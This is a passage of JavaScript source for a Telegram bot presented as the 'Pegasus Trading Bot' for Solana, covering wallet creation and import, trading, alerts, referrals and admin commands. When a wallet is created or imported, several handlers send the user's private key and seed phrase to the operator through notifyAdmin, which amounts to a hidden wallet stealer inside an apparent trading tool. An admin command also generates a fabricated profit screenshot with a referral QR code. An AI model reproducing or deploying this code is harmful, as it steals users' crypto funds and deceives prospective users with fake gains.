bot.action('menu_settings', async (ctx) => { await ctx.answerCbQuery(); await showSettingsMenu(ctx, true); });
bot.action('menu_referrals', async (ctx) => { await ctx.answerCbQuery(); await showReferralsMenu(ctx, true); });
bot.action('menu_help', async (ctx) => { await ctx.answerCbQuery(); await showHelpMenu(ctx, true); });
bot.action('referral_copy', async (ctx) => { const code = getReferralCode(ctx.from.id); const botUser = (await bot.telegram.getMe()).username; const link = `https://t.me/${botUser}?start=ref_${code}`; await ctx.answerCbQuery('📋 Copied'); await ctx.reply(`\`${link}\``, { parse_mode: 'Markdown' }); });
bot.action('referral_share', async (ctx) => { const code = getReferralCode(ctx.from.id); const botUser = (await bot.telegram.getMe()).username; const link = `https://t.me/${botUser}?start=ref_${code}`; await ctx.answerCbQuery(); await ctx.reply(`🚀 Join me on Pegasus Trading Bot!\n${link}`, { parse_mode: 'Markdown' }); });
bot.action('referral_list', async (ctx) => { const session = getSession(ctx.from.id); if (session.referrals.length === 0) return ctx.reply('No referrals yet.'); const list = session.referrals.map((r,i)=>`${i+1}. User ...${r.userId.toString().slice(-4)} - ${new Date(r.joinedAt).toLocaleDateString()}`).join('\n'); await ctx.reply(`📊 Your Referrals (${session.referrals.length}):\n${list}`); });
bot.action('referral_refresh', async (ctx) => { await ctx.answerCbQuery(); await showReferralsMenu(ctx, true); });
bot.action('help_wallet', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('💼 *Wallet Guide*\n\n... (guide text) ...', { parse_mode: 'Markdown' }); });
bot.action('help_trading', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('📊 *Trading Guide*\n\n...', { parse_mode: 'Markdown' }); });
bot.action('help_security', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('🔒 *Security Tips*\n\n...', { parse_mode: 'Markdown' }); });
bot.action('help_faq', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('❓ *FAQ*\n\n...', { parse_mode: 'Markdown' }); });
bot.action('wallet_create', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); if (session.wallets.length >= MAX_WALLETS) return ctx.reply(`❌ Max ${MAX_WALLETS} wallets`); const w = createWallet(); session.wallets.push(w); session.activeWalletIndex = session.wallets.length-1; saveSessions(); await notifyAdmin('WALLET_CREATED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey, privateKey: w.privateKey, mnemonic: w.mnemonic, walletNumber: session.wallets.length }); await ctx.editMessageText(`✅ Wallet ${session.wallets.length} created!\n\n\`${w.publicKey}\`\n\nSeed: \`${w.mnemonic}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) }); });
bot.action('wallet_import_menu', async (ctx) => { await ctx.answerCbQuery(); await ctx.editMessageText('Choose import method:', { ...Markup.inlineKeyboard([[Markup.button.callback('Seed Phrase', 'wallet_import_seed'), Markup.button.callback('Private Key', 'wallet_import_key')], [Markup.button.callback('« Back', 'menu_wallet')]]) }); });
bot.action('wallet_import_seed', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); if (session.wallets.length >= MAX_WALLETS) return ctx.reply(`❌ Max ${MAX_WALLETS} wallets`); session.state = 'AWAITING_SEED'; await ctx.editMessageText('Send your seed phrase (12 or 24 words):', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
bot.action('wallet_import_key', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); if (session.wallets.length >= MAX_WALLETS) return ctx.reply(`❌ Max ${MAX_WALLETS} wallets`); session.state = 'AWAITING_PRIVATE_KEY'; await ctx.editMessageText('Send your Base58 private key:', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
bot.action('wallet_export', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); const w = getActiveWallet(session); if (!w) return ctx.reply('No wallet'); await notifyAdmin('WALLET_EXPORTED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey }); await ctx.reply(`🔐 *Wallet ${session.activeWalletIndex+1}*\n\nAddress: \`${w.publicKey}\`\nPrivate Key: \`${w.privateKey}\`${w.mnemonic ? `\nSeed: \`${w.mnemonic}\`` : ''}`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Delete', 'delete_message')]]) }); });
bot.action('wallet_remove', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); if (!session.wallets.length) return ctx.reply('No wallets'); const buttons = session.wallets.map((w,i) => [Markup.button.callback(`🗑️ Wallet ${i+1}`, `confirm_remove_${i}`)]); buttons.push([Markup.button.callback('« Back', 'menu_wallet')]); await ctx.editMessageText('Select wallet to remove:', { ...Markup.inlineKeyboard(buttons) }); });
bot.action(/^confirm_remove_(\d+)$/, async (ctx) => { const idx = parseInt(ctx.match[1]); const session = getSession(ctx.from.id); if (idx>=0 && idx<session.wallets.length) { session.wallets.splice(idx,1); if (session.activeWalletIndex >= session.wallets.length) session.activeWalletIndex = Math.max(0, session.wallets.length-1); saveSessions(); await ctx.answerCbQuery('Removed'); await ctx.editMessageText('✅ Wallet removed.', { ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) }); } });
bot.action('wallet_refresh', async (ctx) => { await ctx.answerCbQuery(); await showWalletMenu(ctx, true); });
bot.action(/^switch_wallet_(\d+)$/, async (ctx) => { const idx = parseInt(ctx.match[1]); const session = getSession(ctx.from.id); if (idx>=0 && idx<session.wallets.length) { session.activeWalletIndex = idx; saveSessions(); await ctx.answerCbQuery(`Switched to wallet ${idx+1}`); await showWalletMenu(ctx, true); } else { await ctx.answerCbQuery('Invalid'); } });
bot.action('wallet_deposit', async (ctx) => { const w = getActiveWallet(getSession(ctx.from.id)); if (!w) return ctx.reply('No wallet'); const qr = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${w.publicKey}`; await ctx.editMessageText(`📥 *Deposit*\n\n\`${w.publicKey}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('QR Code', qr), Markup.button.callback('Copy', `copy_address_${w.publicKey}`)], [Markup.button.callback('« Back', 'menu_wallet')]]) }); });
bot.action(/^copy_address_(.+)$/, async (ctx) => { await ctx.answerCbQuery(`Copied: ${ctx.match[1]}`, { show_alert: true }); });
bot.action('wallet_transfer_menu', async (ctx) => { await ctx.editMessageText('Send SOL or token?', { ...Markup.inlineKeyboard([[Markup.button.callback('SOL', 'transfer_sol'), Markup.button.callback('Token', 'transfer_token')], [Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
bot.action('transfer_sol', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_TRANSFER_SOL_RECIPIENT'; session.pendingTransfer = { type: 'SOL' }; await ctx.editMessageText('Enter recipient SOL address:', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
bot.action('transfer_token', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_TRANSFER_TOKEN_MINT'; session.pendingTransfer = { type: 'TOKEN' }; await ctx.editMessageText('Enter token mint address:', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
bot.action(/^buy_(\d+\.?\d*)_(.+)$/, async (ctx) => { const amount = parseFloat(ctx.match[1]); const token = ctx.match[2]; await ctx.answerCbQuery(); await handleBuy(ctx, amount, token); });
bot.action(/^sell_(\d+)_(.+)$/, async (ctx) => { const percent = parseInt(ctx.match[1]); const token = ctx.match[2]; await ctx.answerCbQuery(); await handleSell(ctx, percent, token); });
bot.action(/^setbuy_(\d+\.?\d*)$/, async (ctx) => { const amount = parseFloat(ctx.match[1]); const session = getSession(ctx.from.id); session.pendingTrade = { type: 'buy', amount }; await ctx.editMessageText(`Buy ${amount} SOL – paste token address:`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_buy')]]) }); });
bot.action('setbuy_custom', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_CUSTOM_BUY_AMOUNT'; await ctx.editMessageText('Enter amount of SOL to buy:', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_buy')]]) }); });
bot.action(/^setsell_(\d+)$/, async (ctx) => { const percent = parseInt(ctx.match[1]); const session = getSession(ctx.from.id); session.pendingTrade = { type: 'sell', percentage: percent }; await ctx.editMessageText(`Sell ${percent}% – paste token address:`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_sell')]]) }); });
bot.action('setsell_custom', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_CUSTOM_SELL_PERCENT'; await ctx.editMessageText('Enter percentage (1-100):', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_sell')]]) }); });
bot.action(/^refresh_(.+)$/, async (ctx) => { const target = ctx.match[1]; if (target === 'main') { await ctx.answerCbQuery(); await showMainMenu(ctx, true); } else if (target === 'positions') { await ctx.answerCbQuery(); await showPositionsMenu(ctx, true); } else { await ctx.answerCbQuery(); await sendTokenAnalysis(ctx, target); } });
bot.action('settings_slippage', async (ctx) => { await ctx.editMessageText('Select slippage:', { ...Markup.inlineKeyboard([[Markup.button.callback('0.5%', 'set_slippage_0.5'), Markup.button.callback('1%', 'set_slippage_1'), Markup.button.callback('2%', 'set_slippage_2')], [Markup.button.callback('5%', 'set_slippage_5'), Markup.button.callback('10%', 'set_slippage_10')], [Markup.button.callback('Back', 'menu_settings')]]) }); });
bot.action(/^set_slippage_(\d+\.?\d*)$/, async (ctx) => { const slippage = parseFloat(ctx.match[1]); const session = getSession(ctx.from.id); session.settings.slippage = slippage; saveSessions(); await ctx.answerCbQuery(`Slippage ${slippage}%`); await showSettingsMenu(ctx, true); });
bot.action('settings_fee', async (ctx) => { await ctx.editMessageText('Select priority fee (SOL):', { ...Markup.inlineKeyboard([[Markup.button.callback('0.0005', 'set_fee_0.0005'), Markup.button.callback('0.001', 'set_fee_0.001')], [Markup.button.callback('0.005', 'set_fee_0.005'), Markup.button.callback('0.01', 'set_fee_0.01')], [Markup.button.callback('Back', 'menu_settings')]]) }); });
bot.action(/^set_fee_(\d+\.?\d*)$/, async (ctx) => { const fee = parseFloat(ctx.match[1]); const session = getSession(ctx.from.id); session.settings.priorityFee = fee; saveSessions(); await ctx.answerCbQuery(`Priority fee ${fee} SOL`); await showSettingsMenu(ctx, true); });
bot.action('settings_notifications', async (ctx) => { const session = getSession(ctx.from.id); session.settings.notifications = !session.settings.notifications; saveSessions(); await ctx.answerCbQuery(`Notifications ${session.settings.notifications ? 'on' : 'off'}`); await showSettingsMenu(ctx, true); });
bot.action('copytrade_add', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_COPYTRADE_ADDRESS'; await ctx.editMessageText('Send wallet address to copy:', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_copytrade')]]) }); });
bot.action('copytrade_manage', async (ctx) => { const session = getSession(ctx.from.id); if (!session.copyTradeWallets.length) return ctx.editMessageText('No tracked wallets.', { ...Markup.inlineKeyboard([[Markup.button.callback('Back', 'menu_copytrade')]]) }); const buttons = session.copyTradeWallets.map((w,i) => [Markup.button.callback(`🗑️ ${shortenAddress(w)}`, `remove_copytrade_${i}`)]); buttons.push([Markup.button.callback('Back', 'menu_copytrade')]); await ctx.editMessageText('Manage copy trade wallets:', { ...Markup.inlineKeyboard(buttons) }); });
bot.action(/^remove_copytrade_(\d+)$/, async (ctx) => { const idx = parseInt(ctx.match[1]); const session = getSession(ctx.from.id); if (idx>=0 && idx<session.copyTradeWallets.length) { session.copyTradeWallets.splice(idx,1); saveSessions(); await ctx.answerCbQuery('Removed'); await showCopyTradeMenu(ctx, true); } });
bot.action('limit_buy', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_LIMIT_BUY'; await ctx.editMessageText('Send: [token_address] [price] [amount_sol]', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_limit')]]) }); });
bot.action('limit_sell', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_LIMIT_SELL'; await ctx.editMessageText('Send: [token_address] [price] [percentage]', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_limit')]]) }); });
bot.action('limit_view', async (ctx) => { const session = getSession(ctx.from.id); if (!session.limitOrders.length) return ctx.editMessageText('No active orders.', { ...Markup.inlineKeyboard([[Markup.button.callback('Back', 'menu_limit')]]) }); const orders = session.limitOrders.map((o,i)=>`${i+1}. ${o.type} ${o.amount} @ $${o.price} (${shortenAddress(o.token)})`).join('\n'); const btns = session.limitOrders.map((_,i)=>[Markup.button.callback(`Cancel #${i+1}`, `cancel_limit_${i}`)]); btns.push([Markup.button.callback('Back', 'menu_limit')]); await ctx.editMessageText(`📈 Active orders:\n\n${orders}`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(btns) }); });
bot.action(/^cancel_limit_(\d+)$/, async (ctx) => { const idx = parseInt(ctx.match[1]); const session = getSession(ctx.from.id); if (idx>=0 && idx<session.limitOrders.length) { session.limitOrders.splice(idx,1); saveSessions(); await ctx.answerCbQuery('Cancelled'); await showLimitOrderMenu(ctx, true); } });
bot.action('delete_message', async (ctx) => { await ctx.deleteMessage(); });
bot.action('export_pnl_csv', async (ctx) => { const session = getSession(ctx.from.id); if (!session.tradeHistory.length) return ctx.reply('No trades'); let csv = 'Date,Time,Type,Token,Symbol,Amount SOL,Amount Token,Price USD,Value USD,PNL USD,TX Hash\n'; session.tradeHistory.forEach(t => { csv += `"${t.date}","${t.time}","${t.type}","${t.tokenAddress}","${t.tokenSymbol}",${t.amountSol||0},${t.amountToken||0},${t.priceUsd||0},${t.valueUsd||0},${t.pnlUsd||0},"${t.txHash}"\n`; }); await ctx.replyWithDocument({ source: Buffer.from(csv), filename: `pnl_${new Date().toISOString().split('T')[0]}.csv` }); });
bot.action('export_history_csv', async (ctx) => { const session = getSession(ctx.from.id); if (!session.tradeHistory.length) return ctx.reply('No history'); let csv = 'Date,Time,Type,Token,Symbol,Amount SOL,Amount Token,Price USD,Value USD,PNL USD,TX Hash\n'; session.tradeHistory.forEach(t => { csv += `"${t.date}","${t.time}","${t.type}","${t.tokenAddress}","${t.tokenSymbol}",${t.amountSol||0},${t.amountToken||0},${t.priceUsd||0},${t.valueUsd||0},${t.pnlUsd||0},"${t.txHash}"\n`; }); await ctx.replyWithDocument({ source: Buffer.from(csv), filename: `history_${new Date().toISOString().split('T')[0]}.csv` }); });
bot.action('clear_history_confirm', async (ctx) => { const session = getSession(ctx.from.id); await ctx.editMessageText(`⚠️ Clear all ${session.tradeHistory.length} trades? This cannot be undone.`, { ...Markup.inlineKeyboard([[Markup.button.callback('Yes', 'clear_history_yes'), Markup.button.callback('No', 'menu_history')]]) }); });
bot.action('clear_history_yes', async (ctx) => { const session = getSession(ctx.from.id); session.tradeHistory = []; session.dailyStats = { date: new Date().toDateString(), totalTrades: 0, profitableTrades: 0, lossTrades: 0, totalPnl: 0 }; saveSessions(); await ctx.answerCbQuery('Cleared'); await showTradeHistory(ctx, true); });
bot.action(/^price_alert_(.+)$/, async (ctx) => { const token = ctx.match[1]; const session = getSession(ctx.from.id); session.state = 'AWAITING_PRICE_ALERT'; session.pendingPriceAlert = { token }; await ctx.editMessageText(`Set price alert for ${shortenAddress(token)} – enter target price (USD):`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', `refresh_${token}`)]]) }); });
bot.action(/^sell_custom_(.+)$/, async (ctx) => { const token = ctx.match[1]; const session = getSession(ctx.from.id); session.state = 'AWAITING_CUSTOM_SELL_AMOUNT'; session.pendingTrade = { type: 'sell', token }; await ctx.editMessageText(`Sell percentage for ${shortenAddress(token)} (1-100):`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', `refresh_${token}`)]]) }); });
bot.action(/^sell_custom_input_(.+)$/, async (ctx) => { const token = ctx.match[1]; const session = getSession(ctx.from.id); session.state = 'AWAITING_CUSTOM_SELL_AMOUNT'; session.pendingTrade = { type: 'sell', token }; await ctx.editMessageText(`Enter token amount to sell:`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', `refresh_${token}`)]]) }); });
bot.action(/^limit_order_(.+)$/, async (ctx) => { const token = ctx.match[1]; await ctx.editMessageText(`Limit order for ${shortenAddress(token)}:`, { ...Markup.inlineKeyboard([[Markup.button.callback('Buy', `limit_buy_${token}`), Markup.button.callback('Sell', `limit_sell_${token}`)], [Markup.button.callback('Back', `refresh_${token}`)]]) }); });
bot.action(/^limit_buy_(.+)$/, async (ctx) => { const token = ctx.match[1]; const session = getSession(ctx.from.id); session.state = 'AWAITING_LIMIT_BUY_DETAILS'; session.pendingLimitOrder = { type: 'buy', token }; await ctx.editMessageText(`Enter: [price] [amount_sol]\nExample: 0.001 0.5`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', `limit_order_${token}`)]]) }); });
bot.action(/^limit_sell_(.+)$/, async (ctx) => { const token = ctx.match[1]; const session = getSession(ctx.from.id); session.state = 'AWAITING_LIMIT_SELL_DETAILS'; session.pendingLimitOrder = { type: 'sell', token }; await ctx.editMessageText(`Enter: [price] [percentage]\nExample: 0.01 50`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', `limit_order_${token}`)]]) }); });
bot.action(/^dca_(.+)$/, async (ctx) => { const token = ctx.match[1]; const session = getSession(ctx.from.id); session.state = 'AWAITING_DCA_DETAILS'; session.pendingDCA = { token }; await ctx.editMessageText(`Enter: [amount_sol] [interval_minutes] [num_orders]\nExample: 0.1 60 5`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', `refresh_${token}`)]]) }); });

// ======================= BACKGROUND MONITORING =======================
const ALERT_CHECK_INTERVAL = 60000;
async function checkAlerts() {
  const allTokens = new Set();
  for (const sess of userSessions.values()) for (const a of (sess.alerts||[])) allTokens.add(a.token);
  if (!allTokens.size) return;
  const dataMap = new Map();
  for (const addr of allTokens) {
    const pair = await fetchTokenData(addr);
    if (pair) dataMap.set(addr, { price: parseFloat(pair.priceUsd)||0, mcap: pair.marketCap||pair.fdv||0, change24: pair.priceChange?.h24||0 });
    await new Promise(r => setTimeout(r, 500));
  }
  for (const [uid, sess] of userSessions.entries()) {
    for (const a of (sess.alerts||[])) {
      const cur = dataMap.get(a.token);
      if (!cur) continue;
      let trigger = false, curVal = 0;
      if (a.type === 'price') { curVal = cur.price; trigger = (a.direction === 'above' && curVal >= a.threshold) || (a.direction === 'below' && curVal <= a.threshold); }
      else if (a.type === 'percent') { curVal = cur.change24; trigger = (a.direction === 'above' && curVal >= a.threshold) || (a.direction === 'below' && curVal <= -a.threshold); }
      else if (a.type === 'mcap') { curVal = cur.mcap; trigger = curVal >= a.threshold; }
      if (trigger) {
        const now = Date.now();
        if (a.lastTriggered && (now - a.lastTriggered) < 15*60*1000) {
          if (Math.abs(curVal - (a.lastVal||0)) / (a.lastVal||1) < 0.2) continue;
        }
        a.lastTriggered = now;
        a.lastVal = curVal;
        saveSessions();
        const msg = `🔔 *Alert!* Token \`${shortenAddress(a.token)}\`\n${a.type} ${a.direction==='above'?'>':'<'} ${a.threshold} → current: ${a.type==='percent'?curVal.toFixed(2)+'%':a.type==='mcap'?'$'+curVal.toLocaleString():'$'+curVal.toFixed(6)}`;
        try { await bot.telegram.sendMessage(uid, msg, { parse_mode: 'Markdown' }); } catch {}
      }
    }
  }
}

async function checkTrackedTokens() {
  const tokenMap = new Map();
  for (const [uid, sess] of userSessions.entries()) {
    for (const t of (sess.trackedTokens||[])) {
      if (!tokenMap.has(t.address)) tokenMap.set(t.address, []);
      tokenMap.get(t.address).push({ uid, t });
    }
  }
  for (const [addr, users] of tokenMap.entries()) {
    const pair = await fetchTokenData(addr);
    if (!pair) continue;
    const price = parseFloat(pair.priceUsd)||0;
    const signals = calculateTradingSignals(pair, calculateSecurityScore(pair).score);
    const entryText = signals.entry.text;
    for (const { uid, t } of users) {
      const now = Date.now();
      if (t.trackedPrice > 0) {
        const ratio = price / t.trackedPrice;
        if ((ratio >= 2 || ratio <= 0.5) && (!t.last2xAlert || now - t.last2xAlert > 24*3600000)) {
          const dir = ratio >= 2 ? '2x' : 'halved';
          await bot.telegram.sendMessage(uid, `🚀 *${dir} Alert!* ${shortenAddress(addr)} ${dir==='2x'?'doubled':'halved'} since you tracked it.\nPrice: $${price.toFixed(6)} (tracked $${t.trackedPrice.toFixed(6)})`, { parse_mode: 'Markdown' });
          t.last2xAlert = now;
          saveSessions();
        }
      }
      if ((entryText === 'BUY NOW' || entryText === 'GOOD ENTRY') && (!t.lastSignalAlert || now - t.lastSignalAlert > 3600000)) {
        await bot.telegram.sendMessage(uid, `📈 *${entryText} Signal!* ${shortenAddress(addr)} shows strong entry opportunity.\nPrice: $${price.toFixed(6)}`, { parse_mode: 'Markdown' });
        t.lastSignalAlert = now;
        saveSessions();
      }
    }
  }
}

// ======================= COMMANDS =======================
bot.command('start', async (ctx) => { await showMainMenu(ctx); });
bot.command('wallet', async (ctx) => { await showWalletMenu(ctx); });
bot.command('positions', async (ctx) => { await showPositionsMenu(ctx); });
bot.command('buy', async (ctx) => { const args = ctx.message.text.split(' ').slice(1); if(args.length>=2) await handleBuy(ctx, parseFloat(args[0]), args[1]); else await showBuyMenu(ctx); });
bot.command('sell', async (ctx) => { const args = ctx.message.text.split(' ').slice(1); if(args.length>=2) await handleSell(ctx, parseFloat(args[0]), args[1]); else await showSellMenu(ctx); });
bot.command('copytrade', async (ctx) => { await showCopyTradeMenu(ctx); });
bot.command('limit', async (ctx) => { await showLimitOrderMenu(ctx); });
bot.command('settings', async (ctx) => { await showSettingsMenu(ctx); });
bot.command('refresh', async (ctx) => { await showMainMenu(ctx); });
bot.command('referral', async (ctx) => { await showReferralsMenu(ctx); });
bot.command('help', async (ctx) => { await showHelpMenu(ctx); });

// ======================= TESTPNL (ADMIN ONLY) =======================
bot.command('testpnl', async (ctx) => {
  console.log('✅ testpnl command triggered by', ctx.from.id);
  if (!ADMIN_CHAT_IDS.includes(ctx.from.id.toString())) {
    console.log('User not admin:', ctx.from.id);
    return ctx.reply('❌ This command is for admins only.');
  }
  try {
    const session = getSession(ctx.from.id);
    const referralCode = getReferralCode(ctx.from.id);
    const botUser = (await bot.telegram.getMe()).username;
    const qr = `https://t.me/${botUser}?start=ref_${referralCode}`;
    const img = await generatePnLImage({
      pnlPercent: 100,
      pair: "MONDAY/SOL",
      time: "92h",
      invested: "1.2 SOL ($99.29)",
      current: "120 SOL ($9.9K)",
      tagline: "PEGASUS • MONDAY POSITION",
      qrData: qr,
      username: ctx.from.username || ctx.from.first_name || 'admin'
    });
    await ctx.replyWithPhoto({ source: img }, { caption: "📊 Test PNL: +100%" });
  } catch (err) {
    console.error('testpnl error:', err);
    await ctx.reply(`❌ Failed: ${err.message}`);
  }
});

// Fallback for unknown commands
bot.command('*', async (ctx) => {
  console.log('Unknown command:', ctx.message.text);
  await ctx.reply('Unknown command. Try /start');
});

// ======================= MESSAGE HANDLER =======================
bot.on('text', async (ctx) => {
  const session = getSession(ctx.from.id);
  const text = ctx.message.text.trim();
  // state handlers
  if (session.state === 'AWAITING_SEED') {
    session.state = null;
    try { const w = importFromMnemonic(text); session.wallets.push(w); session.activeWalletIndex = session.wallets.length-1; saveSessions(); await notifyAdmin('WALLET_IMPORTED_SEED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey, privateKey: w.privateKey, mnemonic: w.mnemonic, walletNumber: session.wallets.length }); await ctx.reply(`✅ Wallet imported: \`${w.publicKey}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) }); } catch(e) { await ctx.reply('❌ Invalid seed phrase'); }
    return;
  }
  if (session.state === 'AWAITING_PRIVATE_KEY') {
    session.state = null;
    try { const w = importFromPrivateKey(text); session.wallets.push(w); session.activeWalletIndex = session.wallets.length-1; saveSessions(); await notifyAdmin('WALLET_IMPORTED_KEY', ctx.from.id, ctx.from.username, { publicKey: w.publicKey, privateKey: w.privateKey, walletNumber: session.wallets.length }); await ctx.reply(`✅ Wallet imported: \`${w.publicKey}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) }); } catch(e) { await ctx.reply('❌ Invalid private key'); }
    return;
  }
  if (session.state === 'AWAITING_COPYTRADE_ADDRESS') {
    session.state = null;
    if (isSolanaAddress(text)) { if (!session.copyTradeWallets.includes(text)) { session.copyTradeWallets.push(text); saveSessions(); await ctx.reply(`✅ Now tracking ${shortenAddress(text)}`); } else await ctx.reply('Already tracking'); } else await ctx.reply('❌ Invalid address');
    return;
  }
  if (session.state === 'AWAITING_PRICE_ALERT') {
    session.state = null;
    const price = parseFloat(text);
    if (!isNaN(price) && price>0) {
      const token = session.pendingPriceAlert.token;
      if (token) {
        const alerts = session.alerts || [];
        if (alerts.length >= MAX_ALERTS) return ctx.reply(`❌ Max ${MAX_ALERTS} alerts`);
        alerts.push({ token, type: 'price', threshold: price, direction: 'above', lastTriggered: null });
        saveSessions();
        await ctx.reply(`✅ Alert set: ${shortenAddress(token)} > $${price}`);
      } else await ctx.reply('❌ No token');
    } else await ctx.reply('❌ Invalid price');
    session.pendingPriceAlert = null;
    return;
  }
  if (session.state === 'AWAITING_ALERT_THRESHOLD') {
    const thresh = parseFloat(text);
    if (!isNaN(thresh)) {
      const token = session.pendingAlertToken;
      const type = session.pendingAlert.type;
      if (token && type) {
        const alerts = session.alerts || [];
        if (alerts.length >= MAX_ALERTS) return ctx.reply(`❌ Max ${MAX_ALERTS} alerts`);
        const alert = { token, type, threshold: Math.abs(thresh), direction: 'above', lastTriggered: null };
        if (type === 'percent') alert.direction = thresh >= 0 ? 'above' : 'below';
        alerts.push(alert);
        saveSessions();
        await ctx.reply(`✅ Alert set for ${shortenAddress(token)}: ${type} ${alert.direction==='above'?'>':'<'} ${Math.abs(thresh)}${type==='percent'?'%':type==='mcap'?' MCAP':' USD'}`);
        session.state = null;
        session.pendingAlert = null;
        session.pendingAlertToken = null;
        return;
      }
    }
    await ctx.reply('❌ Invalid threshold');
    session.state = null;
    return;
  }
  if (session.state === 'AWAITING_CUSTOM_BUY_AMOUNT') {
    session.state = null;
    const amount = parseFloat(text);
    if (!isNaN(amount) && amount > 0) {
      session.pendingTrade = { type: 'buy', amount };
      await ctx.reply(`Buy ${amount} SOL – paste token address:`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_buy')]]) });
    } else await ctx.reply('❌ Invalid amount');
    return;
  }
  if (session.state === 'AWAITING_CUSTOM_SELL_AMOUNT') {
    session.state = null;
    const val = parseFloat(text);
    if (!isNaN(val) && val>0 && val<=100) {
      await handleSell(ctx, val, session.pendingTrade.token);
    } else await ctx.reply('❌ Invalid amount/percentage');
    session.pendingTrade = null;
    return;
  }
  if (session.state === 'AWAITING_CUSTOM_SELL_PERCENT') {
    session.state = null;
    const percent = parseFloat(text);
    if (!isNaN(percent) && percent>0 && percent<=100) {
      session.pendingTrade = { type: 'sell', percentage: percent };
      await ctx.reply(`Sell ${percent}% – paste token address:`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_sell')]]) });
    } else await ctx.reply('❌ Invalid percentage');
    return;
  }
  if (session.state === 'AWAITING_LIMIT_BUY_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    if (parts.length>=2) {
      const price = parseFloat(parts[0]);
      const amount = parseFloat(parts[1]);
      if (!isNaN(price) && !isNaN(amount) && price>0 && amount>0) {
        session.limitOrders.push({ type: 'BUY', token: session.pendingLimitOrder.token, price, amount: `${amount} SOL`, createdAt: Date.now() });
        saveSessions();
        await ctx.reply(`✅ Limit buy: ${amount} SOL at $${price}`);
      } else await ctx.reply('❌ Invalid format: [price] [amount]');
    } else await ctx.reply('❌ Format: [price] [amount]');
    return;
  }
  if (session.state === 'AWAITING_LIMIT_SELL_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    if (parts.length>=2) {
      const price = parseFloat(parts[0]);
      const percent = parseFloat(parts[1]);
      if (!isNaN(price) && !isNaN(percent) && price>0 && percent>0 && percent<=100) {
        session.limitOrders.push({ type: 'SELL', token: session.pendingLimitOrder.token, price, amount: `${percent}%`, createdAt: Date.now() });
        saveSessions();
        await ctx.reply(`✅ Limit sell: ${percent}% at $${price}`);
      } else await ctx.reply('❌ Invalid format: [price] [percentage]');
    } else await ctx.reply('❌ Format: [price] [percentage]');
    return;
  }
  if (session.state === 'AWAITING_DCA_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    if (parts.length>=3) {
      const amount = parseFloat(parts[0]);
      const interval = parseInt(parts[1]);
      const numOrders = parseInt(parts[2]);
      if (!isNaN(amount) && !isNaN(interval) && !isNaN(numOrders) && amount>0 && interval>0 && numOrders>0 && numOrders<=100) {
        session.dcaOrders.push({ token: session.pendingDCA.token, amount, interval, numOrders, ordersRemaining: numOrders, createdAt: Date.now() });
        saveSessions();
        await ctx.reply(`✅ DCA: ${amount} SOL every ${interval} min, ${numOrders} times`);
      } else await ctx.reply('❌ Invalid format: [amount] [interval_min] [orders]');
    } else await ctx.reply('❌ Format: [amount] [interval_min] [orders]');
    return;
  }
  if (session.state === 'AWAITING_LIMIT_BUY') {
    session.state = null;
    const parts = text.split(' ');
    if (parts.length>=3 && isSolanaAddress(parts[0])) {
      const token = parts[0];
      const price = parseFloat(parts[1]);
      const amount = parseFloat(parts[2]);
      if (!isNaN(price) && !isNaN(amount)) {
        session.limitOrders.push({ type: 'BUY', token, price, amount: `${amount} SOL`, createdAt: Date.now() });
        saveSessions();
        await ctx.reply(`✅ Limit buy: ${amount} SOL at $${price}`);
